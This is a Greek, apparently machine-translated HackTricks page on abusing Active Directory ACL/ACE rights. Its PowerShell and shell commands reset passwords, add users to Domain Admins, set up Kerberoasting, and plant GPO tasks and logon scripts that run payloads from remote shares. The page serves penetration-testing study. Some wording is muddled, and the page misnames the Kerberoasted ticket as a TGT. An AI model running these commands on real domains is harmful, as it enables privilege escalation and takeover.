# Κατάχρηση των ACLs/ACEs του Active Directory

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τα APIs μέχρι τις web εφαρμογές και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Αυτή η σελίδα είναι κυρίως ένα σύνοψη των τεχνικών από το [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) και [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Για περισσότερες λεπτομέρειες, ελέγξτε τα αρχικά άρθρα.**


## **Γενικά δικαιώματα GenericAll στον χρήστη**
Αυτό το δικαίωμα παρέχει σε έναν επιτιθέμενο πλήρη έλεγχο επί ενός στόχου χρήστη. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` χρησιμοποιώντας την εντολή `Get-ObjectAcl`, ένας επιτιθέμενος μπορεί:

- **Αλλαγή του κωδικού πρόσβασης του στόχου**: Χρησιμοποιώντας την εντολή `net user <όνομα_χρήστη> <κωδικός_πρόσβασης> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό πρόσβασης του χρήστη.
- **Επιλεγμένο Kerberoasting**: Αναθέστε ένα SPN στον λογαριασμό του χρήστη για να τον καταστήσετε ευάλωτο στο Kerberoasting, και στη συνέχεια χρησιμοποιήστε τα εργαλεία Rubeus και targetedKerberoast.py για να εξαγάγετε και να προσπαθήσετε να αποκρυπτογραφήσετε τα hashes του εισιτηρίου παροχής (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Επιλεγμένη επίθεση ASREPRoasting**: Απενεργοποιήστε την προ-επαλήθευση για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο στην επίθεση ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Γενικά Δικαιώματα GenericAll σε Ομάδα**
Αυτό το προνόμιο επιτρέπει σε έναν επιτιθέμενο να διαχειριστεί την συμμετοχή σε ομάδες εάν έχει `GenericAll` δικαιώματα σε μια ομάδα όπως οι `Domain Admins`. Αφού εντοπίσει το διακριτό όνομα της ομάδας με την εντολή `Get-NetGroup`, ο επιτιθέμενος μπορεί να:

- **Προσθέσει τον ίδιο στην Ομάδα Domain Admins**: Αυτό μπορεί να γίνει μέσω απευθείας εντολών ή χρησιμοποιώντας εργαλεία όπως το Active Directory ή το PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**
Διατηρώντας αυτά τα προνόμια σε ένα αντικείμενο υπολογιστή ή έναν λογαριασμό χρήστη επιτρέπεται:

- **Περιορισμένη Ανάθεση Πόρων Kerberos**: Επιτρέπει την ανάληψη ελέγχου ενός αντικειμένου υπολογιστή.
- **Σκιώδεις Διαπιστευτήρια**: Χρησιμοποιήστε αυτήν την τεχνική για να προσομοιώσετε έναν υπολογιστή ή έναν λογαριασμό χρήστη εκμεταλλευόμενοι τα προνόμια για τη δημιουργία σκιώδων διαπιστευτηρίων.

## **WriteProperty on Group**
Εάν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα για ένα συγκεκριμένο γκρουπ (π.χ. `Domain Admins`), μπορεί:

- **Προσθήκη του ίδιου στο γκρουπ Domain Admins**: Επιτυγχάνεται μέσω του συνδυασμού των εντολών `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει την ανέλιξη προνομίων εντός του τομέα.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Αυτό (Αυτο-Μέλετη) στην Ομάδα**
Αυτό το προνόμιο επιτρέπει στους επιτιθέμενους να προσθέσουν τον εαυτό τους σε συγκεκριμένες ομάδες, όπως οι `Domain Admins`, μέσω εντολών που παραβιάζουν άμεσα την ιδιότητα μέλους της ομάδας. Χρησιμοποιώντας την παρακάτω ακολουθία εντολών επιτρέπεται η προσθήκη του εαυτού:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Αυτο-Μέλετη)**
Μια παρόμοια προνόμιση, αυτή επιτρέπει στους επιτιθέμενους να προσθέτουν απευθείας τον εαυτό τους σε ομάδες, τροποποιώντας τις ιδιότητες των ομάδων αν έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και η εκτέλεση αυτής της προνόμισης πραγματοποιούνται με:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά του κωδικού πρόσβασης χωρίς να γνωρίζετε τον τρέχοντα κωδικό. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορεί να γίνει μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας αρκετές μεθόδους για την επαναφορά του κωδικού πρόσβασης ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και μονογραμμικών εντολών για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές εκτελέσεις PowerShell έως τη χρήση του `rpcclient` στο Linux, επιδεικνύοντας την ευελιξία των διανυσμάτων επίθεσης.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Εγγραφή ως Κάτοχος σε Ομάδα**
Αν ένας επιτιθέμενος ανακαλύψει ότι έχει δικαιώματα `WriteOwner` σε μια ομάδα, μπορεί να αλλάξει την κυριότητα της ομάδας σε εαυτόν. Αυτό είναι ιδιαίτερα επιδραστικό όταν η συγκεκριμένη ομάδα είναι οι `Domain Admins`, καθώς η αλλαγή της κυριότητας επιτρέπει ευρύτερο έλεγχο στα χαρακτηριστικά και την συμμετοχή της ομάδας. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού αντικειμένου μέσω της εντολής `Get-ObjectAcl` και στη συνέχεια τη χρήση της εντολής `Set-DomainObjectOwner` για την τροποποίηση του κατόχου, είτε με βάση το SID είτε με βάση το όνομα.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite σε Χρήστη**
Αυτή η άδεια επιτρέπει σε έναν επιτιθέμενο να τροποποιήσει τις ιδιότητες του χρήστη. Συγκεκριμένα, με την πρόσβαση `GenericWrite`, ο επιτιθέμενος μπορεί να αλλάξει τη διαδρομή του σεναρίου σύνδεσης ενός χρήστη για να εκτελέσει ένα κακόβουλο σενάριο κατά τη σύνδεση του χρήστη. Αυτό επιτυγχάνεται χρησιμοποιώντας την εντολή `Set-ADObject` για να ενημερώσει την ιδιότητα `scriptpath` του στόχου χρήστη ώστε να δείχνει στο σενάριο του επιτιθέμενου.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite σε Ομάδα**
Με αυτό το προνόμιο, οι επιτιθέμενοι μπορούν να παρεμβάλλονται στην ομάδα μέλη, όπως να προσθέτουν τον εαυτό τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός αντικειμένου διαπιστευτηρίου, τη χρήση του για την προσθήκη ή την αφαίρεση χρηστών από μια ομάδα και τον έλεγχο των αλλαγών στην συμμετοχή με εντολές PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Η ιδιοκτησία ενός αντικειμένου AD και η έχουσα δικαιώματα `WriteDACL` σε αυτό επιτρέπει σε έναν επιτιθέμενο να χορηγήσει στον εαυτό του δικαιώματα `GenericAll` στο αντικείμενο. Αυτό επιτυγχάνεται μέσω της αλλοίωσης του ADSI, επιτρέποντας πλήρη έλεγχο του αντικειμένου και τη δυνατότητα τροποποίησης της ομάδας στην οποία ανήκει. Παρόλα αυτά, υπάρχουν περιορισμοί όταν προσπαθείτε να εκμεταλλευτείτε αυτά τα δικαιώματα χρησιμοποιώντας τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Αναπαραγωγή στον τομέα (DCSync)**
Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένες άδειες αναπαραγωγής στον τομέα για να προσομοιώσει έναν ελεγκτή τομέα και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρήστη. Αυτή η ισχυρή τεχνική απαιτεί άδειες όπως `DS-Replication-Get-Changes`, επιτρέποντας στους επιτιθέμενους να εξάγουν ευαίσθητες πληροφορίες από το περιβάλλον AD χωρίς άμεση πρόσβαση σε έναν ελεγκτή τομέα.
[**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)







## Ανάθεση GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ανάθεση GPO

Η ανάθεση πρόσβασης για τη διαχείριση των αντικειμένων Group Policy (GPOs) μπορεί να παρουσιάσει σημαντικούς κινδύνους ασφαλείας. Για παράδειγμα, αν ένας χρήστης όπως `offense\spotless` έχει ανατεθεί δικαιώματα διαχείρισης GPO, μπορεί να έχει προνόμια όπως **WriteProperty**, **WriteDacl**, και **WriteOwner**. Αυτές οι άδειες μπορούν να καταχραστούνται για κακόβουλους σκοπούς, όπως εντοπίζεται χρησιμοποιώντας το PowerView:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Εντοπισμός άδειας GPO

Για να εντοπιστούν κακοδιαμορφωμένα GPOs, μπορούν να αλυσοδεθούν οι εντολές του PowerSploit. Αυτό επιτρέπει τον εντοπισμό των GPOs στα οποία ένας συγκεκριμένος χρήστης έχει δικαιώματα διαχείρισης:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Υπολογιστές με εφαρμογή μιας συγκεκριμένης πολιτικής**: Είναι δυνατό να εντοπιστούν οι υπολογιστές στους οποίους εφαρμόζεται μια συγκεκριμένη GPO, βοηθώντας στην κατανόηση της έκτασης της πιθανής επίδρασης.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Πολιτικές που εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως `Get-DomainGPO`.

**Οργανωτικές μονάδες με εφαρμογή μιας συγκεκριμένης πολιτικής**: Ο εντοπισμός των οργανωτικών μονάδων (OUs) που επηρεάζονται από μια συγκεκριμένη πολιτική μπορεί να γίνει χρησιμοποιώντας το `Get-DomainOU`.

### Κατάχρηση GPO - New-GPOImmediateTask

Τα κακοδιαμορφωμένα GPOs μπορούν να εκμεταλλευτούνται για την εκτέλεση κώδικα, για παράδειγμα, δημιουργώντας μια άμεση προγραμματισμένη εργασία. Αυτό μπορεί να γίνει για να προστεθεί ένας χρήστης στην τοπική ομάδα διαχειριστών στους επηρεαζόμενους υπολογιστές, ανεβάζοντας σημαντικά τα προνόμια:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Εκμετάλλευση GPO μέσω του GroupPolicy module

Το GroupPolicy module, εάν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και σύνδεση νέων GPOs, καθώς και την ρύθμιση προτιμήσεων όπως τιμές του μητρώου για την εκτέλεση πίσω πόρτας σε πληγείσες υπολογιστές. Αυτή η μέθοδος απαιτεί την ενημέρωση του GPO και τη σύνδεση ενός χρήστη στον υπολογιστή για την εκτέλεση:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Κατάχρηση GPO

Το SharpGPOAbuse προσφέρει έναν τρόπο για την κατάχρηση υπαρκτών GPOs προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί τροποποίηση των υπαρκτών GPOs ή τη χρήση των εργαλείων RSAT για τη δημιουργία νέων πριν εφαρμοστούν οι αλλαγές:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Ενημέρωση Εξαναγκασμού Πολιτικής

Οι ενημερώσεις των GPO συνήθως γίνονται περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορεί να χρησιμοποιηθεί η εντολή `gpupdate /force` στον στόχο υπολογιστή για να εξαναγκαστεί μια άμεση ενημέρωση της πολιτικής. Αυτή η εντολή εξασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPO θα εφαρμοστούν χωρίς να περιμένουν για τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Κάτω από το Καπό

Κατά την επιθεώρηση των Προγραμματισμένων Εργασιών για ένα συγκεκριμένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως η `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω σεναρίων ή εργαλείων γραμμής εντολών με σκοπό την τροποποίηση της συμπεριφοράς του συστήματος ή την ανέλιξη δικαιωμάτων.

Η δομή της εργασίας, όπως φαίνεται στο αρχείο διαμόρφωσης XML που δημιουργείται από την εντολή `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες της προγραμματισμένης εργασίας - συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των ενεργοποιητών της. Αυτό το αρχείο αναπαριστά τον τρόπο με τον οποίο ορίζονται και διαχειρίζονται οι προγραμματισμένες εργασίες μέσα στα GPO, παρέχοντας έναν τρόπο για την εκτέλεση αυθαίρετων εντολών ή σεναρίων ως μέρος της επιβολής της πολιτικής.

### Χρήστες και Ομάδες

Τα GPO επιτρέπουν επίσης την επεξεργασία των μελών χρηστών και ομάδων στα συστήματα-στόχους. Με την επεξεργασία των αρχείων πολιτικής Χρηστών και Ομάδων απευθείας, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως η τοπική ομάδα `administrators`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης των GPO, που επιτρέπει την τροποποίηση των αρχείων πολιτικής για την προσθήκη νέων χρηστών ή την αλλαγή της συμμετοχής σε ομάδες.

Το αρχείο διαμόρφωσης XML για τους Χρήστες και τις Ομάδες περιγράφει πώς υλοποιούνται αυτές οι αλλαγές. Με την προσθήκη καταχωρίσεων σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να αποκτήσουν αυξημένα δικαιώματα σε όλα τα επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει έναν άμεσο τρόπο ανέλιξης δικαιωμάτων μέσω της κατάχρησης των GPO.

Επιπλέον, μπορούν να ληφθούν υπόψη και επιπλέον μεθόδοι για την εκτέλεση κώδικα ή τη διατήρηση της μόνιμης παρουσίας, όπως η εκμετάλλευση σεναρίων σύνδεσης/αποσύνδεσης, η τροποποίηση κλειδιών μητρώου για την αυτόματη εκκίνηση, η εγκατάσταση λογισμικού μέσω αρχείων .msi ή η επεξεργασία ρυθμίσεων υπηρεσιών. Αυτές οι τεχνικές παρέχουν διάφορες δυνατότητες για τη διατήρηση πρόσβασης και τον έλεγχο των συστημάτων-στόχων μέσω της κατάχρησης των GPO.



## Αναφορές

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControl
